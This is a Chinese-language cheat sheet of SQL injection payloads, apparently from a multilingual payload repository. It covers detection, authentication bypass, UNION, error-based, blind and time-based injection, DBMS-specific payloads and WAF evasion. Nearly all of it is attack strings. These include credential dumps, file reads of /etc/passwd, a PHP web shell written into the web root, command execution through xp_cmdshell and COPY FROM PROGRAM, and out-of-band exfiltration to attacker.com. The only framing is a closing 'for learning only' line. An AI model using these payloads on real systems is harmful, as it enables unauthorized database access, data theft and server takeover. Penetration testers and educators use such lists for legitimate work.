<a id="-sql-injection-payloads"></a>
# 💉 SQL 注入载荷

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./SQLi.tr.md) • [🇬🇷 Ελληνικά](./SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-table-of-contents"></a>
## 📋 目录

- [检测载荷](#-detection-payloads)
- [身份验证绕过](#-authentication-bypass)
- [基于 UNION 的注入](#-union-based-injection)
- [基于错误的注入](#-error-based-injection)
- [SQL 盲注](#-blind-sql-injection)
- [基于时间的注入](#-time-based-injection)
- [数据库管理系统专用载荷](#-dbms-specific)
- [Web 应用防火墙（WAF）绕过](#-waf-bypass)
- [带外（OOB）注入](#-out-of-band)

---

<a id="-detection-payloads"></a>
## 🔍 检测载荷

<a id="basic-detection"></a>
### 基本检测

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

<a id="boolean-detection"></a>
### 布尔检测

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

<a id="arithmetic-detection"></a>
### 算术检测

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

<a id="string-concatenation"></a>
### 字符串拼接

```sql
' || 'test
' + 'test
' 'test
```

---

<a id="-authentication-bypass"></a>
## 🔓 身份验证绕过

<a id="login-bypass"></a>
### 登录绕过

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

<a id="username-field"></a>
### 用户名字段

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

<a id="password-field"></a>
### 密码字段

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

<a id="common-bypass-combinations"></a>
### 常见绕过组合

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

<a id="-union-based-injection"></a>
## 🔗 基于 UNION 的注入

<a id="finding-columns"></a>
### 确定列数

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

<a id="basic-union"></a>
### 基本 UNION 查询

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

<a id="data-extraction"></a>
### 数据提取

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

<a id="union-with-comments"></a>
### 带注释的 UNION 查询

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-error-based-injection"></a>
## ⚠️ 基于错误的注入

<a id="mysql-error-based"></a>
### MySQL 报错注入

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

<a id="mssql-error-based"></a>
### MSSQL 报错注入

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

<a id="postgresql-error-based"></a>
### PostgreSQL 报错注入

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

<a id="oracle-error-based"></a>
### Oracle 报错注入

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

<a id="-blind-sql-injection"></a>
## 🔮 SQL 盲注

<a id="boolean-based-blind"></a>
### 布尔盲注

```sql
-- 真条件
' AND 1=1--
' AND 'a'='a'--

-- 假条件
' AND 1=2--
' AND 'a'='b'--

-- 字符提取
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

<a id="binary-search"></a>
### 二分查找

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

<a id="length-detection"></a>
### 长度检测

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

<a id="tablecolumn-enumeration"></a>
### 表／列枚举

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-time-based-injection"></a>
## ⏱️ 基于时间的注入

<a id="mysql"></a>
### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

<a id="postgresql"></a>
### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

<a id="mssql"></a>
### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

<a id="oracle"></a>
### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-dbms-specific"></a>
## 🗄️ 数据库管理系统专用载荷

<a id="mysql-payloads"></a>
### MySQL 载荷

```sql
-- 版本
' UNION SELECT @@version--
' UNION SELECT version()--

-- 当前用户
' UNION SELECT user()--
' UNION SELECT current_user()--

-- 数据库
' UNION SELECT database()--

-- 表
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- 列
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- 读取文件
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- 写入文件
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

<a id="postgresql-payloads"></a>
### PostgreSQL 载荷

```sql
-- 版本
' UNION SELECT version()--

-- 当前用户
' UNION SELECT current_user--

-- 数据库
' UNION SELECT current_database()--

-- 表
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- 读取文件
' UNION SELECT pg_read_file('/etc/passwd')--

-- 命令执行
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

<a id="mssql-payloads"></a>
### MSSQL 载荷

```sql
-- 版本
' UNION SELECT @@version--

-- 当前用户
' UNION SELECT SYSTEM_USER--

-- 数据库
' UNION SELECT DB_NAME()--

-- 表
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- 命令执行
'; EXEC xp_cmdshell 'whoami';--

-- 启用 xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

<a id="oracle-payloads"></a>
### Oracle 载荷

```sql
-- 版本
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- 当前用户
' UNION SELECT user FROM dual--

-- 数据库
' UNION SELECT ora_database_name FROM dual--

-- 表
' UNION SELECT table_name FROM all_tables--

-- 列
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-waf-bypass"></a>
## 🛡️ Web 应用防火墙（WAF）绕过

<a id="space-bypass"></a>
### 空格过滤绕过

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

<a id="comment-bypass"></a>
### 注释绕过

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

<a id="case-variation"></a>
### 大小写变换

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

<a id="encoding"></a>
### 编码

```sql
-- URL 编码
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- 双重 URL 编码
%2527%20OR%201=1--

-- 十六进制编码
' UNION SELECT 0x61646d696e--  (admin in hex)
```

<a id="keyword-bypass"></a>
### 关键词过滤绕过

```sql
-- UNION 绕过
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- SELECT 绕过
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- AND/OR 绕过
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

<a id="hpp-http-parameter-pollution"></a>
### HPP (HTTP 参数污染)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

<a id="-out-of-band"></a>
## 📡 带外（OOB）注入

<a id="mysql-oob"></a>
### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

<a id="mssql-oob"></a>
### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

<a id="postgresql-oob"></a>
### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

<a id="oracle-oob"></a>
### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="detection-order"></a>
### 检测顺序

1. `'` - 单引号
2. `"` - 双引号
3. `' OR '1'='1` - 布尔注入
4. `' AND SLEEP(5)--` - 基于时间
5. `' UNION SELECT NULL--` - 基于 UNION

<a id="common-endpoints"></a>
### 常见端点

```
- 登录表单
- 搜索框
- URL 中的用户 ID
- Cookie 值
- HTTP 请求头（User-Agent、Referer）
- API 参数
```

<a id="sql-comments-by-dbms"></a>
### 各数据库的 SQL 注释语法

| DBMS | 注释 |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

<a id="-resources"></a>
## 📚 参考资料

- [PortSwigger SQL 注入资料](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 SQL 注入载荷库</b><br>
  <i>仅供学习使用！</i>
</p>

> 译注：各载荷依赖具体数据库、版本、上下文与权限；文件读写、命令执行及带外连接还需对应功能和服务条件。页内部分语句含省略号或说明占位，不能直接视为完整查询。原文示例保持原样。
